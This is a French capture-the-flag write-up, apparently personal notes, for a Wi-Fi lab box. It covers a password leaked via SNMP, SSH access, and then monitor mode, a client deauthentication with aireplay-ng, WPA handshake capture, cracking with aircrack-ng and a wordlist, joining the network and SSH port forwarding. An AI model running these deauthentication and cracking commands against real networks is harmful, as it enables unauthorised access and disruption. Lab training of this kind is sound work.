![[IMG-20260203185108723.png]]

![[IMG-20260203185201076.png]]

```
snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

On utilise ce mdp pour se connecter en SSH:
![[IMG-20260203190006344.png]]

Config Réseau:

![[IMG-20260203192704712.png]]

On retrouve aussi ce schéma dans le home directory:

![[IMG-20260203194454309.png]]

Pour cette boxe, on utilise la ressource suivante: [https://v1lab.wifichallenge.com/walkthrough](https://v1lab.wifichallenge.com/walkthrough "https://v1lab.wifichallenge.com/walkthrough")

On active l'interface wlan0:
```bash
ip link set wlan0 up
```

Et on liste tous les points d’accès Wi-Fi:
```bash
iw dev wlan0 scan
```

![[IMG-20260203205702924.png]]

On se met en mode monitor:
```bash
sudo airmon-ng start wlan0
```

Puis on écoute ce qui se passe sur le réseau:
```bash
airodump-ng wlan0mon -w scan --manufacturer --wps -c6
```

On oserve:
![[IMG-20260203234805112.png]]

On force à présent le user de se reconnecter au Wifi avec cette commande:
```
aireplay-ng -0 5 -a F0:9F:C2:A3:F1:A7  -c 28:6C:07:FE:A3:22  wlan0mon
```

Et on observe en haut de la premiere commande:
```
WPA handshake: F0:9F:C2:A3:F1:A7
```

![[IMG-20260203234855004.png]]

Ensuite on utilise ce mdp pour cracker le mdp du wifi:
```
aircrack-ng -w /root/eaphammer/wordlists/rockyou.txt scan-03.cap
```

![[IMG-20260203235543981.png]]

```
Mdp: challenge
```

On set up une nouvelle interface client:
```bash
ip link set wlan3 down
iw dev wlan3 set type managed
ip link set wlan3 up
```

Config WPA2:
```
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/wifi.conf
```

On se connecte au wifi:
```
wpa_supplicant -B -i wlan3 -c /tmp/wifi.conf
```

On s'attribue une IP:
```
dhclient wlan3
```

On scan le réseau:
![[IMG-20260204004350264.png]]

Et on découvre l'IP 192.168.3.46 qu'on peut scanner:
![[IMG-20260204004601603.png]]

On port forward le port 80 pour acceder au site:
```
ssh -L 8080:192.168.3.1:80 consultant@10.129.17.36 
```

![[IMG-20260204005045033.png]]

